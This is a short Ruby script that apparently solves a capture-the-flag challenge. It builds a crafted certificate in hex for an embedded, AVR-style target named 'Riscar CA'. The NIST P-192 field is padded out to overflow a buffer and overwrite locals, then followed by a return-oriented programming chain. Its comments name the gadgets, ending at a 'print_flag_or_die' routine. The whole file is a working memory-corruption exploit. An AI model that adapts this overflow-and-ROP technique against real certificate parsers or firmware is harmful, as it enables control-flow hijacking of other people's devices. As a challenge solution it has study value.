#!/usr/bin/ruby

def dehex(string)
	string.split.map{|x| x.to_i(16).chr}.join
end
def xx(number)
	'%02x'%[number]
end
def hex(string)
	string.each_byte.map{|x| xx(x)}.join(' ')
end

# Structure
Magic = '30 ZZ'
# length
Riscar =  [0x80, hex('Riscar CA')]
nist =    [0x81, hex('NIST P-192')]
Abba =    [0x82, 'ab ba 42 c0 ff ee 13 37']
EccKey =  [0x83, '04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 0d b7 26 7e']
Unknown = [0x84, 'd9 00 3c ac af 5b 93 5f 9f cb 0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d a8 34 fc 8e 21 02']
Parts = [ Riscar, nist, Abba, EccKey, Unknown]


# Payload
Padding = (1..90).each.map{|x| xx(x) }.join(' ')
Locals  = '4a 09 YY 08 9d 3e 3e 95' # four bytes to cross locals, + four more for cert pointer and saved sp and 
ROP = [
	'00 79 fb    ', # return to INT0_
	'21 0a       ', # populate rx24
	'23 22 21 20 ', # rx22, rx20
	'13 37       ', # populate rx18
	'00 00 00 00 ', # RAMP bytes
	'80 00 01    ', # SREG, r0 r1
	'00 35 14    ', # return to sub_34e2 to get leet
	'ca fe ba be ', # pops
	'00 4e 8f    ', # return to print_flag_or_die_4E8F        
].join.split.join(' ')

nist[1] += ' ' + Padding + ' ' + Locals + ' ' + ROP

begin
	cert = Magic + ' ' + Parts.map { |part|
		length = part.last.split.length
		[xx(part.first), xx(length), part.last].join(' ')
	}.join(' ')
	totalLength = cert.split.length() - 2
	cert = cert.gsub(/ZZ/, xx(totalLength))
	cert = cert.gsub(/YY/, xx(nist.last.split.length))
	cert.split.each_with_index do |x,i|
		print x
		if ( (i+1) % 16 == 0)
			puts
		else
			print ' '
		end
	end
end

